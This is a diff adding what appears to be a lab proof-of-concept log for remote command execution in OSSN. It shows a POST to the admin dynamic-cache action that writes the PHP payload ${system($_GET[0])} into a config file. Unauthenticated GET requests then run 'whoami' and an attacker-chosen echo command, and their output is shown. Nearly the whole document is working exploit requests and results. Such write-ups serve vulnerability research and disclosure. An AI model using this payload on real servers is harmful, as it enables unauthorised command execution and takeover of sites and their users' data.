@@ -1,0 +1,35 @@
+## e04: Arbitrary OS command execution via ${system($_GET[0])} stored in the same config value
+
+## Step 1 - inject command-execution payload via the same action:
+## POST /system/handlers/actions.php?action=admin/dynamic/cache&0=rem  host=${system($_GET[0])}
+HTTP/1.1 302 Found
+Host: 127.0.0.1:8093
+Date: Mon, 28 Sep 2026 18:14:09 GMT
+Connection: close
+X-Powered-By: PHP/8.4.26
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: http://127.0.0.1:8093/
+Content-type: text/html; charset=UTF-8
+
+
+## configurations/ossn.config.dcache.php after the POST:
+
+$Ossn->dynamic_cache_settings = array(
+		"status"   => "disabled",
+		"type"     => "",
+		"host"     => "${system($_GET[0])}",
+		"port"     => "",
+		"username" => "",
+		"password" => "",
+);
+## Step 2 - GET /index.php?0=whoami (unauthenticated page hit; $_GET[0] fed to system()):
+<REDACTED>
+<br />
+<b>Warning</b>:  Undefined variable $<REDACTED> in <b><LAB_ROOT>
+
+## Step 3 - GET /index.php?0=echo+OSSN-RCE-<REDACTED>-OK (attacker-chosen command):
+OSSN-RCE-<REDACTED>-OK
+<br />
+<b>Warning</b>:  Undefined variable $OSSN-RCE-<REDACTED>-OK
